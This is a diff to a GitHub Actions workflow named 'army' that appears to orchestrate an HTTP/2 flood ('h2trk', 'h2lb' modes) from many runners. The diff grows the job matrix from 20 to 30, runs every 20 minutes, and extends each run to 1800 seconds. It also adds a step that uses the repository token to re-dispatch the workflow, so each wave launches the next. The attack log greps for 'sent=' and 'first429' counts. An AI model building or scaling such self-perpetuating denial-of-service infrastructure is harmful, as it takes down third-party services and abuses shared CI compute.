@@ -1,21 +1,24 @@
 name: army
+permissions:
+  actions: write
+  contents: read
 on:
   workflow_dispatch:
     inputs:
       seconds:
-        default: '1200'
+        default: '1800'
       workers:
         default: '4'
       mode:
         default: 'h2trk'
   schedule:
-    - cron: '*/30 * * * *'
+    - cron: '*/20 * * * *'
 jobs:
   r:
     strategy:
       fail-fast: false
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
     runs-on: ubuntu-latest
     timeout-minutes: 50
     steps:
@@ -93,3 +96,12 @@ jobs:
           wait $HP 2>/dev/null || true
           kill $RS 2>/dev/null || true
           echo "== final codes =="; grep -E 'sent=|first429' atk.out 2>/dev/null | tail -3; tail -2 atk.out 2>/dev/null
+      - name: chain next wave
+        if: ${{ always() && matrix.n == 1 }}
+        run: |
+          curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/army.yml/dispatches" \
+            -d '{"ref":"main","inputs":{"seconds":"1800","workers":"4","mode":"h2lb"}}'
+          echo "chained-next-wave"
